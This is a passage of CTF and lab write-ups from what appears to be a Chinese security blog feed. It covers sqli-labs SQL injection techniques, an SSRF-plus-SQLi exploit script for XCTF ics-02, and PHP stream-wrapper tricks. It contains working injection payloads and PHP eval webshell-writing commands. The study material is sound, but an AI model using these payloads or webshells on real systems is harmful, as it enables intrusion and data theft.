a--+请注意这个方法是有一定概率的,所以要多试几次</code></pre><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><strong>报错注入</strong></h3><pre><code>id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select concat_ws(&#39;|||&#39;,password,username) from users limit 1,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #</code></pre><h3 id="利用-double-数值类型超出范围进行报错注入"><a href="#利用-double-数值类型超出范围进行报错注入" class="headerlink" title="利用 double 数值类型超出范围进行报错注入"></a><strong>利用 double 数值类型超出范围进行报错注入</strong></h3><pre><code>存疑,注不出来哦,推测可能是数据库版本问题,回头再说id=1&#39; union select (exp(~(select * FROM (SELECT USER())a))),2,3-- #</code></pre><h3 id="利用-bigint-溢出进行报错注入"><a href="#利用-bigint-溢出进行报错注入" class="headerlink" title="利用 bigint 溢出进行报错注入"></a><strong>利用 bigint 溢出进行报错注入</strong></h3><pre><code>也不行哦id=1&#39; union select (!(select * from (select user())x)-~0),2,3-- #</code></pre><h3 id="xpath-函数报错注入"><a href="#xpath-函数报错注入" class="headerlink" title="xpath 函数报错注入"></a><strong>xpath 函数报错注入</strong></h3><pre><code>id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))-- #id=1&#39; and extractvalue(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),0x7e))-- #id=1&#39; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),0x7e))-- #id=1&#39; and extractvalue(1,concat(0x7e,(select concat_ws(&#39;|||&#39;,password,username) from users limit 1,1),0x7e))-- #</code></pre><h3 id="利用数据的重复性"><a href="#利用数据的重复性" class="headerlink" title="利用数据的重复性"></a><strong>利用数据的重复性</strong></h3><pre><code>id=1&#39; union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x-- #不会注,咋办</code></pre><h2 id="less-6双注入-双引号-字符串"><a href="#less-6双注入-双引号-字符串" class="headerlink" title="less-6双注入-双引号-字符串"></a>less-6双注入-双引号-字符串</h2><p>这关与上一关基本一致,只是闭合方式变成了”</p><pre><code>id=1    正常id=1&#39;    正常id=1&quot;    错误         use near &#39;&quot;1&quot;&quot; LIMIT 0,1&#39; at line 1</code></pre><h2 id="less-7导入文件-字符串"><a href="#less-7导入文件-字符串" class="headerlink" title="less-7导入文件 -字符串"></a>less-7导入文件 -字符串</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203161306209.png" alt="image-20220316130608071"></p><p>提示已经很明显了,写文件进去</p><pre><code>id=1    正常id=1&#39;    错误        You have an error in your SQL syntaxid=1&quot;    正确    是单引号闭合,接着测试id=1&#39; and 1=1--+     报错,说明不止有单引号闭合id=1&#39;) and 1=1--+     报错,说明不止一个括号id=1&#39;)) and 1=1--+    正常,说明是一个单引号加两个括号闭合</code></pre><p>这里接下来可以使用布尔盲注,也可以使用时间盲注,</p><p><strong>布尔盲注</strong></p><pre><code>id=1&#39;))and length(database())=8--+    回显You are in.... Use outfile......id=1&#39;))and length(database())=0--+    回显You have an error in your SQL syntax</code></pre><p><strong>时间盲注</strong></p><pre><code>id=1&#39;))and If(ascii(substr(database(),1,1))=115,1,sleep(5))-- #    无明显延时id=1&#39;))and If(ascii(substr(database(),1,1))=114,1,sleep(5))-- # 有明显延时</code></pre><p><strong>写入文件</strong></p><ol><li><p>首先我们要得到网站的绝对路径,但是在单纯在这一关中,我们无从得知网站的绝对路径,所以我们需要从其他的地方去寻找网站的绝对路径,这里我们从前面的关卡中得到一下</p><pre><code>http://127.0.0.1/sqlilabs/Less-1/?id=-1&#39; union select 1,2,@@datadir--+回显 Your Password:D:\Data\secquan\tools\Environment\PhpStudy\PHPTutorial\MySQL\data\这里我在sqlilabs目录下面新建了一个file目录用来写入数据D:\Data\secquan\tools\Environment\PhpStudy\PHPTutorial\WWW\sqlilabs\file</code></pre></li><li><p>读写权限测试</p><pre><code>id=1&#39;))and (select count(*) from mysql.user)&gt;0 --+回显正常 You are in.... Use outfile......</code></pre></li><li><p>利用into outfile写入文件</p><p> 注意这里如果写不进去的话可能是因为secure_file_priv参数的原因</p><pre><code>作用主要是用来限制load data,select...outfile load_file 传到那个指定的目录当secure_file_priv的值为null时,表示限制mysql不允许导入,导出当secure_file_priv的值为/tmp/,表示限制mysql的导入,导出只能发生在/tmp/目录下当secure_file_priv的值没有具体的值&quot;&quot;时表示不对mysql的导入导出做出限制修改进入mysql的安装目录,找到my.ini修改里面的secure_file_priv参数为&quot;&quot;如果没有发现的话在最后面添加一个: secure_file_priv=&quot;&quot;</code></pre><pre><code>id=-1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;zf&#39;]);?&gt;&quot; into outfile &quot;D:\\Data\\secquan\\tools\\Environment\\PhpStudy\\PHPTutorial\\WWW\\sqlilabs\\file\\zf.php&quot; -- #这里可以发现当使用&#39;&#39;单引号时发现写不进去,使用&quot;&quot;双引号时可以写进去,接着连接就好</code></pre><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203161940506.png" alt="image-20220316194043361"></p></li></ol><h2 id="less-8盲注-基于布尔值单引号"><a href="#less-8盲注-基于布尔值单引号" class="headerlink" title="less-8盲注-基于布尔值单引号"></a>less-8盲注-基于布尔值单引号</h2><p>基本测试说明是单引号闭合</p><pre><code>id=1&#39; and 1=1--+ 回显正常id=1&#39; union Select 1,count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a-- #回显错误id=1&#39;and length(database())=8--+    回显正常id=1&#39;and length(database())=7--+    回显错误</code></pre><h2 id="less-9盲注-基于时间-单引号"><a href="#less-9盲注-基于时间-单引号" class="headerlink" title="less-9盲注 - 基于时间 - 单引号"></a>less-9盲注 - 基于时间 - 单引号</h2><pre><code>id=1    You are in...........id=1&#39;    You are in...........id=1&quot;     You are in...........</code></pre><p>全部回显一样,说明无法使用布尔盲注.时间盲注试一下</p><pre><code>id=1 and sleep(5)-- #    无延时id=1&#39; and sleep(5)-- #    延时五秒id=1&quot; and sleep(5)-- #    无延时</code></pre><p>说明是基于单引号</p><pre><code>id=1&#39; and if (length(database())=7 ,sleep(5),1)--+    无延时id=1&#39; and if (length(database())=8 ,sleep(5),1)--+    延时五秒</code></pre><h2 id="less-10-盲注-基于时间-双引号"><a href="#less-10-盲注-基于时间-双引号" class="headerlink" title="less-10 盲注 - 基于时间 - 双引号"></a>less-10 盲注 - 基于时间 - 双引号</h2><pre><code>id=1    You are in...........id=1&#39;    You are in...........id=1&quot;     You are in...........</code></pre><pre><code>id=1 and sleep(5)-- #    无延时id=1&#39; and sleep(5)-- #    无延时id=1&quot; and sleep(5)-- #     延时五秒</code></pre><p>说明是基于双引号</p><pre><code>id=1&quot;and if (length(database())=7 ,sleep(5),1)--+    无延时id=1&quot; and if (length(database())=8 ,sleep(5),1)--+    延时五秒</code></pre><h2 id="盲注的总结"><a href="#盲注的总结" class="headerlink" title="盲注的总结"></a>盲注的总结</h2><h3 id="基于布尔盲注"><a href="#基于布尔盲注" class="headerlink" title="基于布尔盲注"></a>基于布尔盲注</h3><p>三大截取函数:mid(),substr(),left()</p><p><strong>mid()</strong></p><pre><code>此函数为截取字符串的一部分,mid(column_name,start,length)column_nmae:需要提取的字符字段start:规定开始的位置length:要返回的字段数mid(database(),1,1)&gt;&#39;a&#39;:查看数据库名的第一位</code></pre><p><strong>substr()与substring()</strong></p><pre><code>substr()和substring()函数实现的功能是一样的string substring(string,start,length)string substr(string,start,length)参数描述同mid参数,第一个为要处理的字符串,start为开始位置,length为截取的长度</code></pre><p><strong>left()</strong></p><pre><code>left()得到字符串左部指定个数的字符串left(string,n)    string为要截取的字符串,n为长度</code></pre><p><strong>ord()</strong></p><pre><code>返回第一个字符的ascii码,经常与上面的函数进行组合使用ord(mid(database(),1,1))&gt;114意思就是检测database()的第一位ascii码是否大于114</code></pre><p><strong>ascii()</strong></p><pre><code>substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换为 ascii 值</code></pre><h3 id="正则注入"><a href="#正则注入" class="headerlink" title="正则注入"></a>正则注入</h3><pre><code>1. 判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名。注：正则表达式中 ^[a-z] 表示字符串中开始字符是在 a-z范围内index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^[a-z]&#39; LIMIT 0,1) /*2. 判断第一个字符是否是a-n中的字符index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^[a-n]&#39; LIMIT 0,1)/*3. 确定该字符为nindex.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=&quot;blind_sqli&quot; AND table_name REGEXP &#39;^n&#39; LIMIT 0,1) /*4. 表达式的更换如下expression like this: &#39;^n[a-z]&#39; -&gt; &#39;^ne[a-z]&#39; -&gt; &#39;^new[a-z]&#39; -&gt; &#39;^news[a-z]&#39; -&gt; FALSE这时说明表名为news ，要验证是否是该表明 正则表达式为&#39;^news$&#39;，但是没这必要 直接判断 table_name = ’news‘ 不就行了。5.接下来猜解其它表了 （只需要修改 limit 1,1 -&gt; limit 2,1就可以对接下来的表进行盲注了）这里是错误的！！！regexp匹配的时候会在所有的项都进行匹配。例如：security数据库的表有多个，users，email等select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^u[a-z]&#39; limit 0,1);是正确的select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^us[a-z]&#39; limit 0,1);是正确的select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^em[a-z]&#39; limit 0,1);是正确的select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^us[a-z]&#39; limit 1,1);不正确select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#39;security&#39; and table_name regexp &#39;^em[a-z]&#39; limit 1,1);不正确实验表明：在limit 0,1下，regexp会匹配所有的项。我们在使用regexp时，要注意有可能有多个项，同时要一个个字符去爆破。类似于上述第一条和第二条。而此时limit 0,1此时是对于where table_schema=&#39;security&#39; limit 0,1。table_schema=&#39;security&#39;已经起到了限定作用了，limit有没有已经不重要了</code></pre><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><pre><code>▲select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) from information_schema.columns group by a;//explain:此处有三个点，一是需要 count 计数，二是 floor，取得 0 or 1，进行数据的重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 rand(0)，rand()需要多试几次才行。以上语句可以简化成如下的形式。select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))如果关键的表被禁用了，可以使用这种形式select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2))如果 rand 被禁用了可以使用用户变量来报错select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)▲select exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围//Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上可以参考 exp 报错文章：http://www.cnblogs.com/lcamry/articles/5509124.html▲select !(select * from (select user())x) -（ps:这是减号） ~0//bigint 超出范围；~0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上可以参考文章 bigint 溢出文章 http://www.cnblogs.com/lcamry/articles/5509112.html▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql对xml数据进行查询和修改的 xpath 函数，xpath 语法错误▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;//mysql 重复特性，此处重复了 version，所以报错。</code></pre><h3 id="延时注入-1"><a href="#延时注入-1" class="headerlink" title="延时注入"></a>延时注入</h3><p><strong>sleep</strong></p><pre><code>and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></pre><p><strong>benchmark()</strong></p><pre><code>BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep()函数进行注入。</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界ics-02</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cisc-2/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cisc-2/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界isc-2"><a href="#攻防世界isc-2" class="headerlink" title="攻防世界isc-2"></a>攻防世界isc-2</h1><p>扫目录<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141737810.png" alt="image-20220314173657709"></p><p><strong>download.php</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141737377.png" alt="image-20220314173750346"></p><p><strong>downloads</strong></p><p>目录有文件浏览漏洞</p><p><strong>login</strong></p><p>下有个paper</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141739473.png" alt="image-20220314173902436"></p><p>点一下跳转到</p><pre><code>http://111.200.241.244:65396///index.php/login/download.php?dl=ssrf</code></pre><p>下载下来一个pdf里面是多半是ssrf</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141743103.png" alt="image-20220314174342021"></p><p><strong>js</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141740414.png" alt="image-20220314174023371"></p><p><strong>secret</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141740440.png" alt="image-20220314174047400"></p><p><strong>secret.php</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141745816.png" alt="image-20220314174517774"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141749787.png" alt="image-20220314174949746"></p><p><strong>secret_debug.php</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141746017.png" alt="image-20220314174635982"></p><p>显示ip错误,那么这里就应该是ssrf的利用.这里是secret_debug.php说明结构应该和secret差不多,那么这里就可以注入了.</p><p>这里小试一下sql注入</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141922521.png" alt="image-20220314192223424"></p><pre><code class="python">&quot;txtfirst_name&quot;:&quot;1&#39;&quot;,    #单引号出现报错 right syntax to use near &#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;01/10/2019&#39;,&#39;3541534&#39;)&#39; at line 1&quot;txtfirst_name&quot;:&#39;1&quot;&#39;,      #回显正常 right syntax to use near &#39;5&#39;,&#39;01/10/2019&#39;,&#39;1516838&#39;)&#39; at line 1  </code></pre><p>并且在那么处爆了一个4</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141927199.png" alt="image-20220314192746161"></p><p>说明txtLast_name这里有回显,那么我们需要将语句构造到这里那么的话就需要使用&#x2F;**&#x2F;进行闭合一下下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141931569.png" alt="image-20220314193105531"></p><p>最终闭合之后在4处回显数据库名称</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141931266.png" alt="image-20220314193137234"></p><p>python</p><pre><code class="python">import randomimport urllib.parseimport requestsurl = &#39;http://111.200.241.244:65396/download.php&#39;s1 = &#39;s=3&amp;txtfirst_name=w%27%23&amp;txtmiddle_name=q&amp;txtLast_name=q&amp;txtname_suffix=w&amp;txtdob=22%2F11%2F1111&amp;txtdl_nmbr=1234561&amp;txtRetypeDL=1234561&amp;btnContinue2=Continue&#39;s1 = s1.replace(&#39;&amp;&#39;,&#39;&quot;,&quot;&#39;)s1 = s1.replace(&#39;=&#39;,&#39;&quot;:&quot;&#39;)#print(s1)这里替换一下subquery = &quot;database()&quot;#获取数据库名#ssrfwsubquery = &quot;select table_name from information_schema.tables where table_schema=&#39;ssrfw&#39; limit 1&quot;#cetcYssrfsubquery = &quot;select column_name from information_schema.columns where table_name=&#39;cetcYssrf&#39; limit 1,1&quot;#secretNamesubquery = &quot;select column_name from information_schema.columns where table_name=&#39;cetcYssrf&#39; limit 1,1&quot;#valuesubquery = &quot;select value from cetcYssrf limit 1&quot;#flag&#123;cpg9ssnu_OOOOe333eetc_2018&#125;id = random.randint(1,10000000)params = &#123;&quot;s&quot;:&quot;3&quot;,          &quot;txtfirst_name&quot;:&quot;L&#39;,&#39;1&#39;,(&quot;+subquery+&quot;),&#39;1&#39;/*&quot;,          &quot;txtmiddle_name&quot;:&quot;q&quot;,          &quot;txtLast_name&quot;:&quot;q&quot;,          &quot;txtname_suffix&quot;:&quot;w&quot;,          &quot;txtdob&quot;:&quot;*/,&#39;01/10/2019&quot;,          &quot;txtdl_nmbr&quot;:id,          &quot;txtRetypeDL&quot;:id,          &quot;btnContinue2&quot;:&quot;Continue&quot;&#125;d = &#39;http://127.0.0.1/secret/secret_debug.php?&#39;+urllib.parse.urlencode(params)req = requests.get(url,params=&#123;&quot;dl&quot;:d&#125;)print(req.text)</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界filemanager</title>
      <link href="/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfilemanager/"/>
      <url>/ctf/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/comprehensive-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfilemanager/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传配合二次注入"><a href="#文件上传配合二次注入" class="headerlink" title="文件上传配合二次注入"></a>文件上传配合二次注入</h1><p>扫目录</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203131651570.png" alt="image-20220313165115499"></p><p>下载<a href="http://www.tar.gz文件得到源码/">www.tar.gz文件得到源码</a></p><p><strong>xdctf.sql</strong></p><pre><code class="mysql">SET NAMES utf8;SET FOREIGN_KEY_CHECKS = 0;DROP DATABASE IF EXISTS `xdctf`;CREATE DATABASE xdctf;USE xdctf;DROP TABLE IF EXISTS `file`;CREATE TABLE `file` (  `fid` int(10) unsigned NOT NULL AUTO_INCREMENT,  `filename` varchar(256) NOT NULL,  `oldname` varchar(256) DEFAULT NULL,  `view` int(11) DEFAULT NULL,  `extension` varchar(32) DEFAULT NULL,  PRIMARY KEY (`fid`)) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;SET FOREIGN_KEY_CHECKS = 1;</code></pre><p>这里是数据库的信息主要提供给几个关键字段,有oldname    filename    extension</p><p><strong>common.inc.php</strong></p><pre><code class="php">&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午7:58 */$DATABASE = array(    &quot;host&quot; =&gt; &quot;127.0.0.1&quot;,    &quot;username&quot; =&gt; &quot;root&quot;,    &quot;password&quot; =&gt; &quot;ayshbdfuybwayfgby&quot;,    &quot;dbname&quot; =&gt; &quot;xdctf&quot;,);#数据库连接的基本量$db = new mysqli($DATABASE[&#39;host&#39;], $DATABASE[&#39;username&#39;], $DATABASE[&#39;password&#39;], $DATABASE[&#39;dbname&#39;]);$req = array();foreach (array($_GET, $_POST, $_COOKIE) as $global_var) &#123;    foreach ($global_var as $key =&gt; $value) &#123;        is_string($value) &amp;&amp; $req[$key] = addslashes($value);#值是string 并且请求中的值为addslashes的值&#39;&quot;\%00    &#125;&#125;define(&quot;UPLOAD_DIR&quot;, &quot;upload/&quot;);function redirect($location) &#123;    header(&quot;Location: &#123;$location&#125;&quot;);    exit;&#125;</code></pre><p>这里是数据库的配置文件的信息,对所有的提交数据进行了addslashes转义,当开启gpc魔术方法之后会产生过滤,这里发现并没有,那么如果数据库并没有使用gkb编码的话就无法宽字节绕过,这里未知所以无法直接注入</p><p><strong>upload</strong></p><p>&#96;&#96;&#96;php<br>&lt;?php<br>&#x2F;**</p><ul><li>Created by PhpStorm.</li><li>User: phithon</li><li>Date: 15&#x2F;10&#x2F;14</li><li>Time: 下午8:45</li></ul><p> *&#x2F;</p><p>require_once “common.inc.php”;</p><p>if ($_FILES) </p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议总结</title>
      <link href="/ctf/php%E7%9F%A5%E8%AF%86/%E5%85%B6%E4%BB%96/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
      <url>/ctf/php%E7%9F%A5%E8%AF%86/%E5%85%B6%E4%BB%96/php-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="伪协议总结"><a href="#伪协议总结" class="headerlink" title="伪协议总结"></a>伪协议总结</h1><p>相关协议有:file:&#x2F;&#x2F;    php:&#x2F;&#x2F;filter    php:&#x2F;&#x2F;input    zip:&#x2F;&#x2F;    compress.bzip2:&#x2F;&#x2F;    compress.zilb:&#x2F;&#x2F;    data:&#x2F;&#x2F;等</p><h2 id="file-x2F-x2F-伪协议"><a href="#file-x2F-x2F-伪协议" class="headerlink" title="file:&#x2F;&#x2F;伪协议"></a>file:&#x2F;&#x2F;伪协议</h2><p>php.ini:    PHP的配置文件</p><p>file:&#x2F;&#x2F;协议在双off的情况下也可以正常使用</p><pre><code>allow_url_fopen:offallow_url_include:off</code></pre><p>file:&#x2F;&#x2F;用于访问本地文件系统,在ctf中通常用来读取本地文件且不受allow_url_fopen与allow_url_include</p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法:"></a>使用方法:</h3><ol><li>file:&#x2F;&#x2F; [文件的绝对路径和文件名]</li></ol><pre><code>http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt</code></pre><p>​    2.file:&#x2F;&#x2F;[文件的相对路径加文件名]</p><pre><code>http://127.0.0.1/cmd.php?file=./phpcode.txt</code></pre><p>​    3.fiel:&#x2F;&#x2F;[网络路径和文件名]</p><pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><h2 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h2><p>php:&#x2F;&#x2F;协议</p><p>不需要开启allow_url_fopen,但是php:&#x2F;&#x2F;inpt    php:&#x2F;&#x2F;stdin    php:&#x2F;&#x2F;memory    php:&#x2F;&#x2F;temp需要开启allow_url_include</p><p>php:&#x2F;&#x2F;访问各个输入输出流,在ctf中常用的是php:&#x2F;&#x2F;filter(用于读取源码)    php:&#x2F;&#x2F;input(用于执行php代码)</p><pre><code>allow_url_fopen=offallow_url_include=on</code></pre><h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><h4 id="参数主要"><a href="#参数主要" class="headerlink" title="参数主要"></a>参数主要</h4><table><thead><tr><th>php:&#x2F;&#x2F;filter</th><th>解释</th></tr></thead><tbody><tr><td>resource&#x3D;[要过滤的数据]</td><td>他指定了你要过滤的数据流</td></tr><tr><td>read&#x3D;[读取的过滤器的方法]</td><td>可以指定一个或多个过滤器的名称</td></tr><tr><td>write&#x3D;[写链的过滤器的方法]</td><td>可以指定一个或多个过滤器的名称</td></tr><tr><td>[过滤器的方法]</td><td></td></tr></tbody></table><p><strong>转换过滤器</strong></p><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode 或者convert.base64-decode</td><td>相当于base64_encode()和base64_decode(),base64编码解码</td></tr><tr><td>convert.quoted-printable-encode或者convert.quoted-printable-decode</td><td>quoted-printable字符串与8-bit字符串编码解码</td></tr></tbody></table><p><strong>压缩过滤器</strong></p><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate或者zlib.inflate</td><td>在本地文件系统中创建gzip兼容文件的方法,但不产生命令行工具如gzip的头和尾信息.只是压缩和解压数据流中的有效载荷部分</td></tr><tr><td>bzip2.compress或者bzip2.decompress</td><td>在本地文件系统中创建bz2的兼容文件的方法</td></tr></tbody></table><p><strong>因此利用base64编码的方法</strong></p><p>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;[文件名]    读取文件源码但是对于php文件需要base64编码</p><pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></pre><h3 id="php-x2F-x2F-input执行代码"><a href="#php-x2F-x2F-input执行代码" class="headerlink" title="php:&#x2F;&#x2F;input执行代码"></a>php:&#x2F;&#x2F;input执行代码</h3><p>可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行</p><pre><code>allow_url_fopen=offallow_url_include=on</code></pre><p>php:&#x2F;&#x2F;input</p><p>POST数据    </p><pre><code>&lt;?php info()?&gt;</code></pre><p><strong>使用方法</strong></p><pre><code>http://127.0.0.1/include.php?file=php://inputPOST 数据&lt;?php phpinfo(); ?&gt;</code></pre><p>如果有写入权限,可以写入一句话木马</p><pre><code>http://127.0.0.1/include.php?file=php://inputPOST 数据&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;</code></pre><h2 id="zip-x2F-x2F-与bzip2-x2F-x2F-与zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-与bzip2-x2F-x2F-与zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F;与bzip2:&#x2F;&#x2F;与zlib:&#x2F;&#x2F;协议</h2><pre><code>allow_url_fopen=offallow_url_fopen=off</code></pre><p>zip:&#x2F;&#x2F;    bzip:&#x2F;&#x2F;    zlib:&#x2F;&#x2F;均属于压缩流,可以访问压缩文件中的子文件夹,更重要的是不需要指定后缀名,可以修改为任意后缀:jpg png gif 等等</p><h3 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h3><p><strong>使用</strong></p><p>zip:&#x2F;&#x2F;[压缩文件的绝对路径]%23[压缩文件内的子文件名]    (其中的%23是#的编码)</p><p>压缩phpinfo.txt为phpinfo.zip,压缩包重命名为phpinfo.jpg,并上传</p><pre><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre><h3 id="compress-bzip2-x2F-x2F-file-bz2"><a href="#compress-bzip2-x2F-x2F-file-bz2" class="headerlink" title="compress.bzip2:&#x2F;&#x2F;file.bz2"></a>compress.bzip2:&#x2F;&#x2F;file.bz2</h3><p>**使用 **</p><p>压缩phpinfo.txt为phpinfo.bz2并上传(同样支持任意后缀)</p><pre><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre><h3 id="compress-zlib-x2F-x2F-file-gz"><a href="#compress-zlib-x2F-x2F-file-gz" class="headerlink" title="compress.zlib:&#x2F;&#x2F;file.gz"></a>compress.zlib:&#x2F;&#x2F;file.gz</h3><p><strong>使用</strong></p><p>压缩phpinfo.txt为phpinco.gz并上传(同样支持任意后缀名)</p><pre><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre><h2 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h2><pre><code>allow_url_fopen=onallow_url_include=on</code></pre><p>可以使用data:&#x2F;&#x2F;数据流封装器,以传递响应格式的数据.通常可以用来执行php代码</p><p><strong>使用</strong></p><h3 id="data-x2F-x2F-text-x2F-plain-要执行的php代码"><a href="#data-x2F-x2F-text-x2F-plain-要执行的php代码" class="headerlink" 